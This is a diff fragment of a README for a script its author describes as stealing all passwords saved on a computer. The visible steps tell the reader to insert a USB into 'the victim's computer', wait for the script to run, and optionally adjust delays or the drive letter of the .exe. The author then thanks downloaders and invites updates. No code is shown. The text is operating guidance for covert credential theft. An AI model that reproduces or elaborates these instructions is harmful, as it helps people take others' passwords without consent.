@@ -10,7 +10,7 @@ Hi guys, this is a simple script, that i've made, to steal all passwords saved o
 #
 3)Now remove the USB and put it again into the victim's computer to start the Script (Wait when the script has finished - 11s)
 #
-4)(OPTIONAL) Correct the DELAYS, or the USB location (Default is D:\ but if you've other Disks/USBs, he can change) if you want, from the Open Source File
+4)(OPTIONAL) Correct the DELAYS, or the USB location for the .exe (Default is D:\ but if you've other Disks/USBs, he can change) if you want, from the Open Source File
 #
 # THANK YOU
 Thank you for download ! Write me if you've make an update for this script and if you need help
